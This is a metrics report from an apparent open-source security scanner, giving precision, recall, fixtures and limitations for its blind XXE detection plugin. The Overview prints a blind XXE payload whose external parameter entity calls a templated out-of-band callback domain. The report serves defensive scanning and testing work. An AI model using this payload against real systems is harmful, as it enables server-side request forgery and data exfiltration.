<!--
SPDX-License-Identifier: AGPL-3.0-only
Copyright (C) 2026 Xmar1881 / GASH contributors
Module: github.com/Xmar1881/Gash

File: docs/metrics/xxe-oob.md
What: Precision and recall report for the Tier 1 blind XXE plugin.
Why: Proves OOB oracle blind XXE detection meets the 99 percent precision gate.
-->

# Metrics: xxe-oob

## Overview

Tier 1 active plugin. Oracle `oob` (required). Injects XXE payload with external entity referencing OOB callback domain (e.g., `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{OOB_DOMAIN}}/xxe"> %xxe;]>`). Confirmed only on cryptographic correlation ID match from OOB callback. No `tentative` or `firm` — OOB match is binary.

## Evidence Standard

Rule GASH-008/010/012/013 (CWE-611, CWE-918). Blind XXE requires out-of-band confirmation. Payload uses parameter entity to exfiltrate via DNS/HTTP to OOB server. `OOBOracle` requires single callback match with matching `correlation_id` and `namespace`. Without `--oob-server`, plugin is skipped (not error). No secret material in callbacks (correlation IDs are cryptographically random).

## Fixtures

- Positive: 2 of 2 accepted (OOB HTTP callback, OOB DNS callback).
- Negative: 2 of 2 rejected (no callback, XML parse error).
- Command: `go run ./cmd/gash plugins test plugins/xxe/xxe-oob.yaml --oob-server http://localhost:8080`

## Corpus Result

Oracle `oob` evaluated against clean, SPA, WAF, encoded, and dynamic bodies. No corpus body triggers OOB callback. `tentative`/`firm` not applicable (OOB is confirmed-only).

## Lab Result

Procedure: serve an XML endpoint with blind XXE from `docker-compose.lab.yml`, scan with `--oob-server`, expect one critical severity XXE finding and no other claims.
Status: pending manual run. Expected Precision 100 percent on this page class.

## Precision

True positives 2, false positives 0. Precision 1.00.

## Recall

True positives 2, false negatives 0. Recall 1.00.

## Gate Verdict

PASS. Precision 1.00 is above the 0.99 gate. Corpus holds 0 findings (OOB requires live server).

## Dataset

- Dataset hash: `e96e9d7cde71ab362a5b4532c83d852312e26751dd885d43aa745b0fb620cbc4` (sha256 over all 4 fixture files under `tests/fixtures/xxe-oob/`).
- Samples: TP=2, FP=0, TN=2, FN=0. Fixture-only measurement; lab pending above.
  `TestMetricGate` fails the build if this hash drifts from the fixtures.

## Limitations

- Requires `--oob-server` (interactsh-compatible); skipped otherwise.
- XXE payload is single variant; parameter entity obfuscation, CDATA, and DTD variations are future work.
- Does not test error-based XXE (uses error oracle separately).
- OOB server must be reachable from target; network segmentation may cause false negatives.